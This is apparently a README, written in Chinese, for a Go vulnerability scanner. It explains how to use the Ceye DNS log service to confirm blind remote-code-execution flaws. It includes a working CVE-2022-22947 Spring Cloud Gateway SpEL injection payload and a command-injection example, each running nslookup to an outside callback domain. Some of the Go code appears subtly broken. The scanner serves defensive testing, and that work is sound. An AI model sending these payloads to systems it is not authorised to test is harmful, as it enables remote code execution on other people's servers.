# DNS Log功能使用说明

## 1. 简介

DNS Log是一种用于验证无回显漏洞的技术，通过DNS请求来确认漏洞是否存在。本项目集成了Ceye DNS Log服务，支持在漏洞扫描过程中自动使用DNS Log进行无回显漏洞验证。

## 2. Ceye平台配置

### 2.1 注册Ceye账号

1. 访问[Ceye平台](http://ceye.io/)
2. 注册并登录账号
3. 进入个人中心，获取以下信息：
   - **API Token**：用于调用Ceye API
   - **DNS Domain**：用于接收DNS请求的域名

### 2.2 查看DNS Log记录

登录Ceye平台后，可以在DNS Log页面查看所有DNS请求记录。

## 3. 项目配置

### 3.1 配置文件

在项目根目录下的`config`文件夹中创建或修改配置文件：

#### JSON格式 (`config/config.json`)

```json
{
  "token": "your_ceye_api_token",
  "domain": "your_ceye_dns_domain.ceye.io",
  "enabled": true
}
```

#### YAML格式 (`config/config.yaml`)

```yaml
token: your_ceye_api_token
domain: your_ceye_dns_domain.ceye.io
enabled: true
```

### 3.2 配置项说明

| 配置项 | 类型 | 说明 |
|--------|------|------|
| `token` | string | Ceye平台的API Token |
| `domain` | string | Ceye平台的DNS域名 |
| `enabled` | boolean | 是否启用DNS Log功能 |

## 4. 代码集成

### 4.1 配置加载

项目通过`config`包提供了加载DNS Log配置的功能：

```go
import "vuln-scanner/config"

// 从配置文件加载DNS Log配置
dnsLogConfig, err := config.LoadDNSLogConfigFromFile()
if err != nil {
    fmt.Printf("加载DNS Log配置失败: %v\n", err)
} else {
    fmt.Printf("DNS Log配置加载成功: %s\n", dnsLogConfig.Domain)
}
```

### 4.2 传递配置到扫描器

在`app.go`中，需要将DNS Log配置传递给扫描选项：

```go
import (
    "vuln-scanner/config"
    "vuln-scanner/vulns"
)

func (a *App) StartScan(options ScanOptions) ([]Vulnerability, error) {
    // 加载DNS Log配置
    dnsLogConfig, err := config.LoadDNSLogConfigFromFile()
    if err != nil {
        a.AddLog("WARNING", fmt.Sprintf("加载DNS Log配置失败: %v", err))
    }
    
    // 创建扫描选项
    scanOpts := vulns.ScanOptions{
        Targets:     options.Targets,
        Threads:     options.Threads,
        Timeout:     options.Timeout,
        Proxy:       proxyString,
        CeyeDNSLog:  dnsLogConfig,  // 传递DNS Log配置
        // 其他配置...
    }
    
    // 执行扫描
    // ...
}
```

### 4.3 在漏洞扫描器中使用

在漏洞扫描器的`Scan`方法中，可以这样使用DNS Log：

```go
func (s *YourScanner) Scan(ctx context.Context, target string, options vulns.ScanOptions) ([]common.Vulnerability, error) {
    // 检查DNS Log是否启用
    dnsLogEnabled := options.CeyeDNSLog != nil && options.CeyeDNSLog.Enabled && 
                    options.CeyeDNSLog.Token != "" && options.CeyeDNSLog.Domain != ""
    
    if dnsLogEnabled {
        log.Info("DNS Log功能已启用", map[string]interface{}{"domain": options.CeyeDNSLog.Domain}, baseCtx)
    }
    
    // 生成唯一的DNS子域名
    var dnsSubdomain string
    if dnsLogEnabled {
        randomStr := config.GenerateRandomString(8)
        dnsSubdomain = fmt.Sprintf("%s.%s", randomStr, options.CeyeDNSLog.Domain)
        log.Debug(fmt.Sprintf("生成DNS子域名: %s", dnsSubdomain), baseCtx)
    }
    
    // 构造包含DNS子域名的恶意负载
    payload := map[string]interface{}{
        "name": "malicious-route",
        "predicates": []map[string]interface{}{
            {
                "name": "Path=/malicious-path",
            },
        },
        "filters": []map[string]interface{}{
            {
                "name": "AddResponseHeader",
                "args": map[string]interface{}{
                    "name":  "X-Malicious",
                    "value": "${runtime["exec"]("nslookup " + dnsSubdomain)}",
                },
            },
        },
    }
    
    // 发送验证请求
    payloadBytes, _ := json.Marshal(payload)
    resp, err := client.Post(fmt.Sprintf("%s/actuator/gateway/routes/%s", target, dnsSubdomain), "application/json", payloadBytes)
    if err != nil {
        log.Error("发送请求失败", err, baseCtx)
        return nil, err
    }
    resp.Body.Close()
    
    // 检查DNS Log记录
    if dnsLogEnabled {
        // 等待DNS请求传播
        time.Sleep(5 * time.Second)
        
        // 构造HTTP客户端配置
        httpCfg := &client.HTTPClientConfig{
            Timeout: time.Duration(options.Timeout) * time.Second,
            Proxy:   options.Proxy,
            SkipSSL: options.SkipSSL,
        }
        
        // 调用Ceye API检查记录
        recordFound, err := config.CheckDNSLogRecord(options.CeyeDNSLog, httpCfg, dnsSubdomain)
        if err != nil {
            log.Error("检查DNS Log记录失败", err, baseCtx)
        } else if recordFound {
            log.Info("检测到DNS Log记录，漏洞存在", map[string]interface{}{"subdomain": dnsSubdomain}, baseCtx)
            
            // 记录漏洞信息
            vulnerability := &common.Vulnerability{
                ID:                "CVE-2022-22947",
                VulnerabilityType: "RCE",
                Severity:          "Critical",
                Target:            target,
                URL:               fmt.Sprintf("%s/actuator/gateway/routes/%s", target, dnsSubdomain),
                Payload:           string(payloadBytes),
                Description:       "Spring Cloud Gateway SpEL远程代码执行漏洞",
                Proof:             fmt.Sprintf("DNS Log记录检测到: %s", dnsSubdomain),
                Recommendation:    "升级到安全版本",
            }
            vulnerabilities = append(vulnerabilities, *vulnerability)
        } else {
            log.Info("未检测到DNS Log记录，漏洞可能不存在", baseCtx)
        }
    }
    
    return vulnerabilities, nil
}
```

## 5. 完整测试流程

### 5.1 准备工作

1. 配置Ceye平台并获取API Token和DNS Domain
2. 在项目中创建配置文件并填写Ceye信息
3. 搭建一个存在无回显漏洞的测试环境（如Spring Cloud Gateway 3.1.0）

### 5.2 启动扫描

```bash
# 编译项目
go build

# 运行扫描器
./vuln-scanner -target http://target-url:8080 -scanner cve_2022_22947_scanner
```

### 5.3 查看结果

#### 控制台输出

```
[10:30:00] INFO: 开始CVE-2022-22947漏洞扫描
[10:30:00] INFO: DNS Log功能已启用 {"domain": "your_ceye_domain.ceye.io"}
[10:30:01] DEBUG: 生成DNS子域名: abc123de.your_ceye_domain.ceye.io
[10:30:06] INFO: 检测到DNS Log记录，漏洞存在 {"subdomain": "abc123de.your_ceye_domain.ceye.io"}
[10:30:06] INFO: 扫描完成，发现1个漏洞
```

#### Ceye平台记录

登录Ceye平台，在DNS Log页面可以看到包含`abc123de`的DNS请求记录，证明漏洞存在。

## 6. API参考

### 6.1 config.LoadDNSLogConfigFromFile()

```go
func LoadDNSLogConfigFromFile() (*DNSLogConfig, error)
```

从配置文件加载DNS Log配置。

### 6.2 config.CheckDNSLogRecord()

```go
func CheckDNSLogRecord(cfg *DNSLogConfig, httpCfg *client.HTTPClientConfig, subdomain string) (bool, error)
```

检查DNS Log记录是否存在。

### 6.3 config.GenerateRandomString()

```go
func GenerateRandomString(length int) string
```

生成指定长度的随机字符串，用于创建唯一的DNS子域名。

## 7. 常见问题

### 7.1 配置文件加载失败

检查配置文件路径是否正确，格式是否符合JSON或YAML规范。

### 7.2 无法检测到DNS Log记录

- 检查网络连接是否正常
- 增加等待时间（至少5秒）
- 检查Ceye平台是否有DNS记录
- 确认目标系统可以访问外部网络

### 7.3 API调用失败

检查API Token是否正确，确保扫描器可以访问Ceye API（http://api.ceye.io）。

## 8. 注意事项

1. **DNS延迟**：DNS请求可能存在延迟，建议设置至少5秒的等待时间
2. **配置检查**：在使用DNS Log前，确保配置文件存在且格式正确
3. **网络环境**：确保扫描器可以访问Ceye API和目标系统
4. **错误处理**：添加适当的错误处理，即使DNS Log功能不可用，扫描器也应能正常工作
5. **资源清理**：在测试完成后，清理创建的测试资源（如创建的路由）

## 9. 示例代码

### 9.1 完整的漏洞扫描器使用示例

```go
package vulns

import (
    "bytes"
    "context"
    "encoding/json"
    "fmt"
    "time"
    "vuln-scanner/client"
    "vuln-scanner/common"
    "vuln-scanner/config"
    "vuln-scanner/logger"
)

type ExampleScanner struct {
    statistics ScanStatistics
    startTime  time.Time
}

func NewExampleScanner() *ExampleScanner {
    return &ExampleScanner{}
}

func (s *ExampleScanner) GetScannerName() string {
    return "example_scanner"
}

func (s *ExampleScanner) GetSupportedVulnerabilities() []string {
    return []string{"Example-Vuln"}
}

func (s *ExampleScanner) GetScanStatistics() ScanStatistics {
    if s.statistics.ScanDuration == 0 && !s.startTime.IsZero() {
        s.statistics.ScanDuration = time.Since(s.startTime)
    }
    return s.statistics
}

func (s *ExampleScanner) Scan(ctx context.Context, target string, options ScanOptions) ([]common.Vulnerability, error) {
    var vulnerabilities []common.Vulnerability
    
    // 初始化统计信息
    s.statistics = ScanStatistics{}
    s.startTime = time.Now()
    
    // 获取日志记录器
    log := options.Logger
    if log == nil {
        log = logger.NewDefaultLogger()
    }
    
    // 创建日志上下文
    baseCtx := logger.LogContext{
        Target:      target,
        ScannerName: s.GetScannerName(),
        Timestamp:   time.Now(),
    }
    
    log.Info("开始示例漏洞扫描", baseCtx)
    
    // 检查DNS Log配置
    dnsLogEnabled := options.CeyeDNSLog != nil && options.CeyeDNSLog.Enabled && 
                    options.CeyeDNSLog.Token != "" && options.CeyeDNSLog.Domain != ""
    
    if dnsLogEnabled {
        log.Info("DNS Log功能已启用", map[string]interface{}{"domain": options.CeyeDNSLog.Domain}, baseCtx)
    }
    
    // 创建HTTP客户端
    clientConfig := client.HTTPClientConfig{
        Timeout:   time.Duration(options.Timeout) * time.Second,
        Proxy:     options.Proxy,
        SkipSSL:   options.SkipSSL,
        UserAgent: client.GetRandomUserAgent(),
        Headers:   options.Headers,
        Cookies:   options.Cookies,
    }
    
    httpClient, err := client.NewHTTPClient(clientConfig)
    if err != nil {
        log.Error("创建HTTP客户端失败", err, baseCtx)
        return nil, err
    }
    
    // 生成DNS子域名
    var dnsSubdomain string
    if dnsLogEnabled {
        randomStr := config.GenerateRandomString(8)
        dnsSubdomain = fmt.Sprintf("%s.%s", randomStr, options.CeyeDNSLog.Domain)
        log.Debug(fmt.Sprintf("生成DNS子域名: %s", dnsSubdomain), baseCtx)
    }
    
    // 构造包含DNS子域名的恶意负载
    payload := map[string]interface{}{
        "command": fmt.Sprintf("nslookup %s", dnsSubdomain),
    }
    
    // 发送验证请求
    payloadBytes, _ := json.Marshal(payload)
    resp, err := httpClient.Post(fmt.Sprintf("%s/vulnerable-endpoint", target), "application/json", payloadBytes)
    if err != nil {
        log.Error("发送请求失败", err, baseCtx)
        return nil, err
    }
    resp.Body.Close()
    
    // 检查DNS Log记录
    if dnsLogEnabled {
        time.Sleep(5 * time.Second)
        
        recordFound, err := config.CheckDNSLogRecord(options.CeyeDNSLog, &clientConfig, dnsSubdomain)
        if err != nil {
            log.Error("检查DNS Log记录失败", err, baseCtx)
        } else if recordFound {
            log.Info("检测到DNS Log记录，漏洞存在", map[string]interface{}{"subdomain": dnsSubdomain}, baseCtx)
            
            vulnerability := common.Vulnerability{
                ID:                "Example-Vuln",
                VulnerabilityType: "RCE",
                Severity:          "Critical",
                Target:            target,
                URL:               fmt.Sprintf("%s/vulnerable-endpoint", target),
                Payload:           string(payloadBytes),
                Description:       "示例无回显RCE漏洞",
                Proof:             fmt.Sprintf("DNS Log记录检测到: %s", dnsSubdomain),
                Recommendation:    "修复漏洞",
            }
            vulnerabilities = append(vulnerabilities, vulnerability)
        } else {
            log.Info("未检测到DNS Log记录，漏洞可能不存在", baseCtx)
        }
    }
    
    log.Info("扫描完成", baseCtx)
    s.statistics.ScanDuration = time.Since(s.startTime)
    
    return vulnerabilities, nil
}
```
